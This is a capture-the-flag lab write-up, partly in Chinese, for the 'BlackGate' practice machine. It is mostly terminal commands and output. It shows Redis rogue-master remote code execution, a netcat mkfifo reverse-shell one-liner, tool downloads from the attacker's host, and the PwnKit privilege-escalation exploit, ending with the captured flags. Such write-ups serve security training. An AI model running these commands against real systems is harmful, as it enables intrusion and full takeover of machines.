###### tags: `Offsec` `PG Practice` `Hard` `Linux`

# BlackGate
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.172.176 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.172.176:22
Open 192.168.172.176:6379

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
6379/tcp open  redis   syn-ack Redis key-value store 4.0.14
```

看到`redis`一樣參考別台靶機的步驟[Wombo](PG_Practice/Linux/Wombo.md)
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp6379

┌──(kali㉿kali)-[~/pgplay/redis-rce]
└─$ python3 redis-rce.py -f module.so -r 192.168.172.176 -p 6379 -L 192.168.45.189 -P 6379

[*] Connecting to  192.168.172.176:6379...
[*] Sending SLAVEOF command to server
[+] Accepted connection from 192.168.172.176:6379
[*] Setting filename
[+] Accepted connection from 192.168.172.176:6379
[*] Start listening on 192.168.45.189:6379
[*] Tring to run payload
[+] Accepted connection from 192.168.172.176:56890
[*] Closing rogue server...

[+] What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: i

$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.189 6379 >/tmp/f
```

得shell，在`/home/prudence`得local.txt
```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

prudence@blackgate:~$ cat local.txt
ee0964c3f8675cad90fe11f76f3422eb
```

linpeas(然後卡住什麼意思)
```
prudence@blackgate:/tmp$ wget 192.168.45.189/linpeas.sh
prudence@blackgate:/tmp$ chmod +x linpeas.sh
prudence@blackgate:/tmp$ ./linpeas.sh

...
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
...
```

使用[CVE-2021-4034](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py)得root，進/root得proof.txt
```
prudence@blackgate:/tmp$ wget 192.168.45.189/CVE-2021-4034.py
prudence@blackgate:/tmp$ python3 CVE-2021-4034.py

# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@blackgate:/root# cat proof.txt
cb2f8c0345dd65d955e9c113b06dedf8
```